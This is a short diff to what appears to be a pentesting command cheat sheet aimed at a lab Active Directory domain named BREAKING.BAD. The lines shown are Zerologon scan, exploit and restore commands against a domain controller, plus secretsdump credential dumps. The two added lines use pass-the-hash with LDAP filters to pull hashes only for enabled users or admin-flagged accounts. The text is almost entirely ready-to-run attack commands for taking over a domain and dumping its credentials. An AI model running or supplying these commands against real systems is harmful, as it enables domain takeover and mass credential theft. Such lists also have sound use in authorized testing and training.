@@ -186,6 +186,8 @@ zerologon-scan DC01 192.168.56.101
 zerologon-exploit DC01 192.168.56.101
 secretsdump -no-pass 'BREAKING.BAD'/'DC01$'@'dc01.breaking.bad'
 secretsdump -hashes :a88baa3fdc8f581ee0fb05d7054d43e4 BREAKING.BAD/Administrator@dc01.breaking.bad
+secretsdump -ldapfilter '(&(objectCategory=person)(objectClass=user)(!userAccountControl:1.2.840.113556.1.4.803:=2))' -just-dc -hashes :a88baa3fdc8f581ee0fb05d7054d43e4 BREAKING.BAD/Administrator@dc01.breaking.bad
+secretsdump -ldapfilter '(&(objectClass=user)(adminCount=1))' -just-dc -hashes :a88baa3fdc8f581ee0fb05d7054d43e4 BREAKING.BAD/Administrator@dc01.breaking.bad
 zerologon-restore breaking/dc01@dc01 -target-ip 192.168.56.101 -hexpass 69762...6945d
 pm3 -p /dev/ttyACM0
 proxmark3 -p /dev/ttyACM0
